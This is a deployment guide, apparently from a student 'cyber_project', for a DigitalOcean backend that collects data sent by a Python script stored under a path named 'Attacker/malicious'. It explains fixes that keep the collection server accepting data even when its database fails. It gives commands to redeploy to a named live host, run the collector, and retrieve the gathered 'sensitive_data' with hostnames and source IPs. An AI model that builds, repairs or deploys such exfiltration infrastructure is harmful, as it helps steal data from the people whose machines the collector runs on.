# Backend Deployment & Configuration Guide

## Root Cause of 500 Error

The backend is throwing a 500 error with empty message because:
1. Database environment variables are likely not set on DigitalOcean
2. The connection pool creation fails
3. But the `/api/receive` endpoint still tries to use the database without checking if it's available

## Solution

The updated backend now:
- ✓ Attempts database connection on startup
- ✓ Falls back to mock in-memory storage if database fails
- ✓ Returns proper error messages
- ✓ Continues to accept data regardless of database status

## Files Modified

### `backendJs/server.js`
- Added `dbConnected` and `mockStorageEnabled` flags
- Added `mockData` array for fallback storage
- Modified all endpoints to check database status before use
- Enhanced error handling and logging

### `sendDataOS.py`
- Fixed global variable declaration
- Added JSON serialization for datetime/Path objects
- Added batch sending with chunking
- Better debug output

## Deployment Steps

### 1. Commit Your Changes
```bash
cd cyber_project
git add .
git commit -m "Fix: Backend error handling and Python JSON serialization"
git push origin main
```

### 2. Redeploy Backend on DigitalOcean

#### Option A: Using DigitalOcean Dashboard
1. Go to https://cloud.digitalocean.com/apps
2. Find your app: `clownfish-app-5kdkx`
3. Click "Settings" → "GitHub"
4. Click "Force Build & Deploy" or wait for auto-deployment from main branch

#### Option B: Using DigitalOcean CLI
```bash
# Install doctl if you don't have it
# https://docs.digitalocean.com/reference/doctl/how-to/install/

# Get your app ID
doctl apps list

# Trigger a new deployment
doctl apps update <your-app-id> --spec src/Attacker/malicious/backendJs/app.yaml
```

### 3. Monitor Deployment
```bash
# Check logs
doctl apps logs <your-app-id> --follow

# Test the health endpoint
curl -k https://clownfish-app-5kdkx.ondigitalocean.app/api/health
```

Expected output:
```json
{
  "status": "healthy",
  "database": "using_mock_storage",
  "mockStorage": true,
  "mockDataCount": 0,
  "timestamp": "2025-12-02T..."
}
```

### 4. (Optional) Configure Database

If you want to use a real database instead of mock storage:

#### Set Environment Variables on DigitalOcean:
1. Go to App Settings → Environment Variables
2. Add:
   ```
   DB_HOST=your-aiven-host.aivencloud.com
   DB_PORT=21011
   DB_USER=your_user
   DB_PASSWORD=your_password
   DB_NAME=defaultdb
   ```

3. Redeploy the app

## Testing the Fixed Python Script

```bash
cd cyber_project_T1Y3/src/Attacker/malicious

# Run the data collector
python sendDataOS.py

# You should see output like:
# [*] Sending data to backend server...
# [+] Data sent successfully to backend (Status: 201)
```

## Verification

Check if data was received:
```bash
curl -k https://clownfish-app-5kdkx.ondigitalocean.app/api/data | jq '.'
```

Should return:
```json
{
  "data": [
    {
      "id": 1,
      "data": { "timestamp": "...", "hostname": "...", ... },
      "source_ip": "...",
      "data_type": "sensitive_data",
      "received_at": "..."
    }
  ],
  "count": 1,
  "storage": "memory"
}
```

## Troubleshooting

### Still getting 500 errors?
1. Check backend logs: `doctl apps logs <app-id> --follow`
2. The logs should show either:
   - `[✓] Database pool created successfully` (database OK)
   - `[✗] Database connection error` (using mock storage)
   - Any actual error messages

### Mock storage not working?
1. Restart the backend deployment
2. Check that Node.js version is 18+ (see Dockerfile)
3. Verify port 5000 is accessible

### Want to use real database?
- Get Aiven MySQL credentials
- Set environment variables as shown above
- Redeploy

## Next Steps

Once deployment is complete and working:
1. The Python script will send all collected data to the backend
2. Data will be stored (either in database or mock storage)
3. You can retrieve data via `/api/data` endpoint
4. Monitor the collection process with `/api/health`
